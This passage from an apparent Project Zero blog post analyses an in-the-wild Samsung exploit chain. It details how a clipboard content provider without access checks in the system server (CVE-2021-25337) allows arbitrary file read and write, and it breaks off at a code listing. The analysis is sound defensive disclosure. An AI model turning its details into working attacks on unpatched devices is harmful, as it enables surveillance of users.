0}.lst-kix_lsx8wn19rrkf-0>li{counter-increment:lst-ctn-kix_lsx8wn19rrkf-0}ul.lst-kix_hbruetvjkelf-8{list-style-type:none}ul.lst-kix_hbruetvjkelf-7{list-style-type:none}ul.lst-kix_hbruetvjkelf-6{list-style-type:none}ul.lst-kix_hbruetvjkelf-5{list-style-type:none}ol.lst-kix_gtv3l2c5wia7-1.start{counter-reset:lst-ctn-kix_gtv3l2c5wia7-1 0}ol.lst-kix_olk2lnn0afau-2.start{counter-reset:lst-ctn-kix_olk2lnn0afau-2 0}.lst-kix_olk2lnn0afau-3>li{counter-increment:lst-ctn-kix_olk2lnn0afau-3}ol.lst-kix_lsx8wn19rrkf-1.start{counter-reset:lst-ctn-kix_lsx8wn19rrkf-1 0}.lst-kix_olk2lnn0afau-6>li{counter-increment:lst-ctn-kix_olk2lnn0afau-6}ol.lst-kix_lsx8wn19rrkf-8.start{counter-reset:lst-ctn-kix_lsx8wn19rrkf-8 0}ol.lst-kix_gtv3l2c5wia7-7.start{counter-reset:lst-ctn-kix_gtv3l2c5wia7-7 0}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}.lst-kix_olk2lnn0afau-0>li{counter-increment:lst-ctn-kix_olk2lnn0afau-0}ol.lst-kix_olk2lnn0afau-1.start{counter-reset:lst-ctn-kix_olk2lnn0afau-1 0}ol.lst-kix_gtv3l2c5wia7-0.start{counter-reset:lst-ctn-kix_gtv3l2c5wia7-0 0}.lst-kix_gtv3l2c5wia7-4>li{counter-increment:lst-ctn-kix_gtv3l2c5wia7-4}.lst-kix_gtv3l2c5wia7-1>li{counter-increment:lst-ctn-kix_gtv3l2c5wia7-1}.lst-kix_gtv3l2c5wia7-7>li{counter-increment:lst-ctn-kix_gtv3l2c5wia7-7}ol.lst-kix_olk2lnn0afau-8.start{counter-reset:lst-ctn-kix_olk2lnn0afau-8 0}.lst-kix_lsx8wn19rrkf-3>li{counter-increment:lst-ctn-kix_lsx8wn19rrkf-3}.lst-kix_lsx8wn19rrkf-6>li{counter-increment:lst-ctn-kix_lsx8wn19rrkf-6}ol{margin:0;padding:0}table td,table th{padding:0}.vdnyYxSRCi-c48{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#e0e0e0;border-top-width:1pt;border-right-width:1pt;border-left-color:#e0e0e0;vertical-align:top;border-right-color:#e0e0e0;border-left-width:1pt;border-top-style:solid;background-color:#fafafa;border-left-style:solid;border-bottom-width:1pt;width:507.8pt;border-top-color:#e0e0e0;border-bottom-style:solid}.vdnyYxSRCi-c41{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#e0e0e0;border-top-width:1pt;border-right-width:1pt;border-left-color:#e0e0e0;vertical-align:top;border-right-color:#e0e0e0;border-left-width:1pt;border-top-style:solid;background-color:#fafafa;border-left-style:solid;border-bottom-width:1pt;width:444.8pt;border-top-color:#e0e0e0;border-bottom-style:solid}.vdnyYxSRCi-c10{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#e0e0e0;border-top-width:1pt;border-right-width:1pt;border-left-color:#e0e0e0;vertical-align:top;border-right-color:#e0e0e0;border-left-width:1pt;border-top-style:solid;background-color:#fafafa;border-left-style:solid;border-bottom-width:1pt;width:468pt;border-top-color:#e0e0e0;border-bottom-style:solid}.vdnyYxSRCi-c49{-webkit-text-decoration-skip:none;color:#000000;font-weight:400;text-decoration:line-through;vertical-align:baseline;text-decoration-skip-ink:none;font-family:"Arial";font-style:normal}.vdnyYxSRCi-c16{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:16pt;font-family:"Arial";font-style:normal}.vdnyYxSRCi-c32{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:10pt;font-family:"Arial";font-style:normal}.vdnyYxSRCi-c3{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:10pt;font-family:Consolas,"Courier New";font-style:normal}.vdnyYxSRCi-c31{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:20pt;font-family:"Arial";font-style:normal}.vdnyYxSRCi-c7{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.vdnyYxSRCi-c35{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial"}.vdnyYxSRCi-c17{padding-top:18pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;text-align:left}.vdnyYxSRCi-c52{padding-top:16pt;padding-bottom:4pt;line-height:1.5;page-break-after:avoid;text-align:left}.vdnyYxSRCi-c28{padding-top:20pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;text-align:left}.vdnyYxSRCi-c0{font-size:10pt;font-family:Consolas,"Courier New";color:#616161;font-weight:400}.vdnyYxSRCi-c30{padding-top:0pt;padding-bottom:0pt;line-height:1.38;text-align:left}.vdnyYxSRCi-c5{font-size:10pt;font-family:Consolas,"Courier New";color:#9c27b0;font-weight:400}.vdnyYxSRCi-c47{margin-left:0.8pt;border-spacing:0;border-collapse:collapse;margin-right:auto}.vdnyYxSRCi-c13{font-size:10pt;font-family:Consolas,"Courier New";color:#c53929;font-weight:400}.vdnyYxSRCi-c20{font-size:10pt;font-family:Consolas,"Courier New";color:#455a64;font-weight:400}.vdnyYxSRCi-c24{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.vdnyYxSRCi-c4{font-size:10pt;font-family:Consolas,"Courier New";color:#000000;font-weight:400}.vdnyYxSRCi-c1{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:left}.vdnyYxSRCi-c12{font-size:10pt;font-family:Consolas,"Courier New";color:#3367d6;font-weight:400}.vdnyYxSRCi-c43{color:#222222;font-weight:400;font-size:11pt;font-family:"Arial"}.vdnyYxSRCi-c23{border-spacing:0;border-collapse:collapse;margin-right:auto}.vdnyYxSRCi-c34{color:#000000;font-weight:400;font-size:11pt;font-family:Consolas,"Courier New"}.vdnyYxSRCi-c18{font-size:10pt;font-family:Consolas,"Courier New";color:#0f9d58;font-weight:400}.vdnyYxSRCi-c25{font-size:10pt;font-family:Consolas,"Courier New";color:#00796b;font-weight:400}.vdnyYxSRCi-c42{color:#434343;font-weight:400;font-size:14pt;font-family:"Arial"}.vdnyYxSRCi-c2{font-family:Consolas,"Courier New";color:#0d904f;font-weight:400}.vdnyYxSRCi-c27{-webkit-text-decoration-skip:none;text-decoration:underline;text-decoration-skip-ink:none}.vdnyYxSRCi-c33{text-decoration:none;vertical-align:baseline;font-style:normal}.vdnyYxSRCi-c37{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.vdnyYxSRCi-c51{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;text-decoration:line-through}.vdnyYxSRCi-c21{margin-left:36pt;padding-left:0pt}.vdnyYxSRCi-c6{color:inherit;text-decoration:inherit}.vdnyYxSRCi-c46{font-weight:400;font-family:Consolas,"Courier New"}.vdnyYxSRCi-c36{padding:0;margin:0}.vdnyYxSRCi-c8{orphans:2;widows:2}.vdnyYxSRCi-c26{margin-left:36pt;text-indent:36pt}.vdnyYxSRCi-c45{text-decoration:none;vertical-align:baseline}.vdnyYxSRCi-c9{background-color:#ffff00}.vdnyYxSRCi-c15{background-color:#b6d7a8}.vdnyYxSRCi-c29{background-color:#f4cccc}.vdnyYxSRCi-c11{font-style:italic}.vdnyYxSRCi-c19{height:0pt}.vdnyYxSRCi-c14{height:11pt}.vdnyYxSRCi-c44{font-size:11pt}.vdnyYxSRCi-c22{height:52.5pt}.vdnyYxSRCi-c40{font-weight:700}.vdnyYxSRCi-c39{margin-left:36pt}.vdnyYxSRCi-c38{background-color:#ffffff}.vdnyYxSRCi-c50{color:#222222}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}</style></head><body class="c37 doc-content">
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span class="vdnyYxSRCi-c35 vdnyYxSRCi-c11">Posted by Maddie Stone, Project Zero</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c35 vdnyYxSRCi-c11"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span class="vdnyYxSRCi-c11 vdnyYxSRCi-c40">Note</span><span class="vdnyYxSRCi-c35 vdnyYxSRCi-c11">: The three vulnerabilities discussed in this blog were all fixed in Samsung&rsquo;s March 2021 release. They were fixed as CVE-2021-25337, CVE-2021-25369, CVE-2021-25370. To ensure your Samsung device is up-to-date under settings you can check that your device is running SMR Mar-2021 or later.</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>As defenders, in-the-wild exploit samples give us important insight into what attackers are really doing. We get the &ldquo;ground truth&rdquo; data about the vulnerabilities and exploit techniques they&rsquo;re using, which then informs our further research and guidance to security teams on what could have the biggest impact or return on investment. To do this, we need to know that the vulnerabilities and exploit samples were found in-the-wild. </span><span>Over the past few years there&rsquo;s been tremendous progress in vendor&rsquo;s transparently disclosing when a vulnerability is known to be exploited in-the-wild: </span><span>Adobe, Android, Apple, ARM, Chrome, </span><span>Microsoft, </span><span>Mozilla, and others are sharing this information via their security release note</span><span class="vdnyYxSRCi-c7">s.</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>While</span><span class="vdnyYxSRCi-c7">&nbsp;we understand that Samsung has yet to annotate any vulnerabilities as in-the-wild, going forward, Samsung has committed to publicly sharing when vulnerabilities may be under limited, targeted exploitation, as part of their release notes. </span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>We hope that, like Samsung, others will join their industry peers in disclosing when there is evidence to suggest that a vulnerability is being exploited in-the-wild in one of their products. </span></p><h1 class="vdnyYxSRCi-c28 vdnyYxSRCi-c8" id="h.a4kixp1dzrny"><span>The exploit sample</span></h1>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>The Google Threat Analysis Group (TAG) obtained a partial exploit chain for Samsung devices that TAG believes belonged to a commercial surveillance vendor. These exploits were likely discovered in the testing phase. </span><span class="vdnyYxSRCi-c7">The sample is from late 2020. The chain merited further analysis because it is a 3 vulnerability chain where all 3 vulnerabilities are within Samsung custom components, including a vulnerability in a Java component. This exploit analysis was completed in collaboration with Clement Lecigne from TAG.</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>The sample used three vulnerabilities, all patched in March 2021 by Samsung: </span></p><ol class="c36 lst-kix_lsx8wn19rrkf-0 start" start="1"><li style="margin-left: 46pt;" class="c1 c21 c8 li-bullet-0"><span class="vdnyYxSRCi-c7">Arbitrary file read/write via the clipboard provider - CVE-2021-25337</span></li><li style="margin-left: 46pt;" class="c1 c21 c8 li-bullet-0"><span>Kernel information leak via </span><span class="vdnyYxSRCi-c2">sec_log</span><span class="vdnyYxSRCi-c7">&nbsp;- CVE-2021-25369</span></li><li style="margin-left: 46pt;" class="c1 c21 c8 li-bullet-0"><span class="vdnyYxSRCi-c7">Use-after-free in the Display Processing Unit (DPU) driver - CVE-2021-25370</span></li></ol>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span class="vdnyYxSRCi-c7">The exploit sample targets Samsung phones running kernel 4.14.113 with the Exynos SOC. Samsung phones run one of two types of SOCs depending on where they&rsquo;re sold. For example the Samsung phones sold in the United States, China, and a few other countries use a Qualcomm SOC and phones sold most other places (ex. Europe and Africa) run an Exynos SOC. The exploit sample relies on both the Mali GPU driver and the DPU driver which are specific to the Exynos Samsung phones.</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span class="vdnyYxSRCi-c7">Examples of Samsung phones that were running kernel 4.14.113 in late 2020 (when this sample was found) include the S10, A50, and A51.</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>The in-the-wild sample that was obtained is a JNI native library file that would have been loaded as a part of an app. Unfortunately TAG did not obtain the app that would have been used with this library. Getting initial code execution via an application is a path that we&rsquo;ve seen in other campaigns this year. </span><span class="vdnyYxSRCi-c24"><a class="vdnyYxSRCi-c61" href="https://blog.google/threat-analysis-group/italian-spyware-vendor-targets-users-in-italy-and-kazakhstan/">TAG</a></span><span>&nbsp;and </span><span class="vdnyYxSRCi-c24"><a class="vdnyYxSRCi-c61" href="https://googleprojectzero.blogspot.com/2022/06/curious-case-carrier-app.html">Project Zero</a></span><span class="vdnyYxSRCi-c7">&nbsp;published detailed analyses of one of these campaigns in June. </span></p><h1 class="vdnyYxSRCi-c28 vdnyYxSRCi-c8" id="h.e0me6pgei4ix"><span class="vdnyYxSRCi-c31">Vulnerability #1 - Arbitrary filesystem read and write</span></h1>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>The exploit chain used CVE-2021-25337 for an initial arbitrary file read and write. The exploit is running as the </span><span class="vdnyYxSRCi-c2">untrusted_app</span><span>&nbsp;SELinux context, but uses the </span><span class="vdnyYxSRCi-c2">system_server</span><span class="vdnyYxSRCi-c7">&nbsp;SELinux context to open files that it usually wouldn&rsquo;t be able to access. This bug was due to a lack of access control in a custom Samsung clipboard provider that runs as the system user. </span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span class="vdnyYxSRCi-c7"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgnrMtDmG4HptsA4AWfg404rrysHRNHsnGwDE6LY1iWCH2ywFNiQy4qn6yuV9ONlcJ2_YilTV8pd1um42sMKqVhKQliJWco-ZF9Vq0z24fCavXMMcM6jsFLP-JDuw726K7zXOtvC5Cb4K_bWcNUkl3Y2hlWwiIGS0FOjkJNG1oWDSQ7bc9RGm6ZUQXN/s1104/image2.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgnrMtDmG4HptsA4AWfg404rrysHRNHsnGwDE6LY1iWCH2ywFNiQy4qn6yuV9ONlcJ2_YilTV8pd1um42sMKqVhKQliJWco-ZF9Vq0z24fCavXMMcM6jsFLP-JDuw726K7zXOtvC5Cb4K_bWcNUkl3Y2hlWwiIGS0FOjkJNG1oWDSQ7bc9RGm6ZUQXN/s1104/image2.png" border="0" alt="Screenshot of the CVE-2021-25337 entry from Samsung&#39;s March 2021 security update. It reads: &amp;quot;SVE-2021-19527 (CVE-2021-25337): Arbitrary file read/write vulnerability via unprotected clipboard content provider &nbsp;Severity: Moderate Affected versions: P(9.0), Q(10.0), R(11.0) devices except ONEUI 3.1 in R(11.0) Reported on: November 3, 2020 Disclosure status: Privately disclosed. An improper access control in clipboard service prior to SMR MAR-2021 Release 1 allows untrusted applications to read or write arbitrary files in the device. The patch adds the proper caller check to prevent improper access to clipboard service." style="max-height: 750px; max-width: 600px;"title="Screenshot of the CVE-2021-25337 entry from Samsung&#39;s March 2021 security update. It reads: &amp;quot;SVE-2021-19527 (CVE-2021-25337): Arbitrary file read/write vulnerability via unprotected clipboard content provider &nbsp;Severity: Moderate Affected versions: P(9.0), Q(10.0), R(11.0) devices except ONEUI 3.1 in R(11.0) Reported on: November 3, 2020 Disclosure status: Privately disclosed. An improper access control in clipboard service prior to SMR MAR-2021 Release 1 allows untrusted applications to read or write arbitrary files in the device. The patch adds the proper caller check to prevent improper access to clipboard service." /></a></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p><h2 class="vdnyYxSRCi-c17 vdnyYxSRCi-c8" id="h.6kvrbnoz6uxg"><span class="vdnyYxSRCi-c16">About Android content providers</span></h2>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>In Android, </span><span class="vdnyYxSRCi-c24"><a class="vdnyYxSRCi-c61" href="https://developer.android.com/guide/topics/providers/content-providers">Content Providers</a></span><span>&nbsp;manage the storage and system-wide access of different data. Content providers organize their data as tables with columns representing the type of data collected and the rows representing each piece of data. Content providers are </span><span class="vdnyYxSRCi-c24"><a class="vdnyYxSRCi-c61" href="https://developer.android.com/guide/topics/providers/content-provider-creating#ContentProvider">required to implement six abstract methods</a></span><span>: </span><span class="vdnyYxSRCi-c2">query</span><span>, </span><span class="vdnyYxSRCi-c2">insert</span><span>,</span><span class="vdnyYxSRCi-c2">&nbsp;update</span><span>, </span><span class="vdnyYxSRCi-c2">delete</span><span>, </span><span class="vdnyYxSRCi-c2">getType</span><span>, and </span><span class="vdnyYxSRCi-c2">onCreate</span><span>. All of these methods besides </span><span class="vdnyYxSRCi-c2">onCreate</span><span class="vdnyYxSRCi-c7">&nbsp;are called by a client application.</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>According to the </span><span class="vdnyYxSRCi-c24"><a class="vdnyYxSRCi-c61" href="https://developer.android.com/guide/topics/providers/content-provider-creating#Permissions">Android documentation</a></span><span class="vdnyYxSRCi-c7">:</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c26"><span><br></span><span class="vdnyYxSRCi-c35 vdnyYxSRCi-c11">All applications can read from or write to your provider, even if the underlying data is private, because by default your provider does not have permissions set. To change this, set permissions for your provider in your manifest file, using attributes or child elements of the &lt;provider&gt; element. You can set permissions that apply to the entire provider, or to certain tables, or even to certain records, or all three.</span></p><h2 class="vdnyYxSRCi-c17 vdnyYxSRCi-c8" id="h.q6l9tyie3537"><span class="vdnyYxSRCi-c16">The vulnerability</span></h2>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>Samsung created a custom clipboard content provider that runs within the system server. The </span><span class="vdnyYxSRCi-c24"><a class="vdnyYxSRCi-c61" href="https://cs.android.com/android/platform/superproject/+/master:frameworks/base/services/java/com/android/server/SystemServer.java">system server</a></span><span>&nbsp;is a very privileged process on Android that manages many of the services critical to the functioning of the device, such as the WifiService and TimeZoneDetectorService. The system server runs as the privileged </span><span class="vdnyYxSRCi-c2">system</span><span>&nbsp;user (UID 1000, </span><span class="vdnyYxSRCi-c2">AID_system</span><span>) and under the </span><span class="vdnyYxSRCi-c2">system_server</span><span class="vdnyYxSRCi-c7">&nbsp;SELinux context.</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>Samsung added a custom clipboard content provider to the system server. This custom clipboard provider is specifically for images. In the </span><span class="vdnyYxSRCi-c2">com.android.server.semclipboard.SemClipboardProvider</span><span class="vdnyYxSRCi-c7">&nbsp;class, there are the following variables:</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span><br></span><span class="vdnyYxSRCi-c33 vdnyYxSRCi-c34">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DATABASE_NAME = &lsquo;clipboardimage.db&rsquo;</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span class="vdnyYxSRCi-c34 vdnyYxSRCi-c33">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;TABLE_NAME = &lsquo;ClipboardImageTable&rsquo;</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span class="vdnyYxSRCi-c34 vdnyYxSRCi-c33">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;URL = &lsquo;content://com.sec.android.semclipboardprovider/images&rsquo;</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span class="vdnyYxSRCi-c34 vdnyYxSRCi-c33">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CREATE_TABLE = &quot; CREATE TABLE ClipboardImageTable (id INTEGER PRIMARY KEY AUTOINCREMENT, &nbsp;_data TEXT NOT NULL);&quot;;</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c34 vdnyYxSRCi-c33"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span class="vdnyYxSRCi-c51">Unlike content providers that live in &ldquo;normal&rdquo; apps and can restrict access via permissions in their manifest as explained above, content providers in the system server are responsible for restricting access in their own code.</span><span class="vdnyYxSRCi-c44 vdnyYxSRCi-c49">&nbsp;The system server is a single JAR (services.jar) on the firmware image and doesn&rsquo;t have a manifest for any permissions to go in. Therefore it&rsquo;s up to the code within the system server to do its own access checking. </span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span class="vdnyYxSRCi-c11">UPDATE 10 Nov 2022: The system server code is not an app in its own right. Instead its code lives in a JAR, </span><span class="vdnyYxSRCi-c2">services.jar</span><span class="vdnyYxSRCi-c11">. Its manifest is found in </span><span class="vdnyYxSRCi-c2">/system/framework/framework-res.apk</span><span class="vdnyYxSRCi-c11">. In this case, the entry for the </span><span class="vdnyYxSRCi-c2">SemClipboardProvider</span><span class="vdnyYxSRCi-c11 vdnyYxSRCi-c35">&nbsp;in the manifest is:</span></p>
 <p class="c30 c8 c14 c38"><span class="vdnyYxSRCi-c33 vdnyYxSRCi-c43"></span></p><a id="t.4abf9747174430e2619adf352acba88a7de57bde"></a><a id="t.0"></a><table class="vdnyYxSRCi-c23"><tr class="vdnyYxSRCi-c22"><td class="vdnyYxSRCi-c41" colspan="1" rowspan="1">
 <p class="vdnyYxSRCi-c8 vdnyYxSRCi-c30"><span class="vdnyYxSRCi-c25">&lt;provider</span><span class="vdnyYxSRCi-c4">&nbsp;android:name</span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c4">&quot;com.android.server.semclipboard.SemClipboardProvider&quot; android:enabled</span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c4">&quot;true&quot; android:exported</span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c4">&quot;true&quot; android:multiprocess</span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c4">&quot;false&quot; android:authorities</span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c4">&quot;com.sec.android.semclipboardprovider&quot; android:singleUser</span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c4">&quot;true&quot;</span><span class="vdnyYxSRCi-c25 vdnyYxSRCi-c33">/&gt;</span></p></td></tr></table>
 <p class="c1 c8 c14 c38"><span class="vdnyYxSRCi-c32"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c38"><span class="vdnyYxSRCi-c11 vdnyYxSRCi-c50">Like &ldquo;normal&rdquo; app-defined components, the system server could use the </span><span class="vdnyYxSRCi-c2">android:permission</span><span class="vdnyYxSRCi-c50">&nbsp;</span><span class="vdnyYxSRCi-c43 vdnyYxSRCi-c11 vdnyYxSRCi-c45">attribute to control access to the provider, but it does not. Since there is not a permission required to access the SemClipboardProvider via the manifest, any access control must come from the provider code itself. Thanks to Edward Cunningham for pointing this out!</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>The </span><span class="vdnyYxSRCi-c2">ClipboardImageTable</span><span>&nbsp;defines only two columns for the table as seen above: </span><span class="vdnyYxSRCi-c2">id</span><span>&nbsp;and </span><span class="vdnyYxSRCi-c2">_data</span><span>. </span><span>The column name </span><span class="vdnyYxSRCi-c2">_data</span><span>&nbsp;has a special use in Android content providers.</span><span>&nbsp;It can be used with the </span><span class="vdnyYxSRCi-c2 vdnyYxSRCi-c27"><a class="vdnyYxSRCi-c61" href="https://developer.android.com/reference/android/content/ContentProvider#openFileHelper(android.net.Uri,%20java.lang.String)">openFileHelper</a></span><span>&nbsp;method to open a file at a specified path. Only the URI of the row in the table is passed to </span><span class="vdnyYxSRCi-c2">openFileHelper</span><span>&nbsp;and a </span><span class="vdnyYxSRCi-c24"><a class="vdnyYxSRCi-c61" href="https://developer.android.com/reference/android/os/ParcelFileDescriptor">ParcelFileDescriptor</a></span><span>&nbsp;object for the path stored in that row is returned. The </span><span class="vdnyYxSRCi-c2">ParcelFileDescriptor</span><span>&nbsp;class then provides the </span><span class="vdnyYxSRCi-c2 vdnyYxSRCi-c27"><a class="vdnyYxSRCi-c61" href="https://developer.android.com/reference/android/os/ParcelFileDescriptor#getFd()">getFd</a></span><span>&nbsp;method to get the native file descriptor (fd) for the returned </span><span class="vdnyYxSRCi-c2">ParcelFileDescriptor</span><span class="vdnyYxSRCi-c7">. </span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p><a id="t.e18ec8258d62d1bc4c9a78a85fafcf74e0c9ab36"></a><a id="t.1"></a><table class="vdnyYxSRCi-c23"><tr class="vdnyYxSRCi-c19"><td class="vdnyYxSRCi-c10" colspan="1" rowspan="1">
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">public</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c12">Uri</span><span class="vdnyYxSRCi-c4">&nbsp;insert</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c12">Uri</span><span class="vdnyYxSRCi-c4">&nbsp;uri</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c12">ContentValues</span><span class="vdnyYxSRCi-c4">&nbsp;values</span><span class="vdnyYxSRCi-c0">)</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">{</span></p>
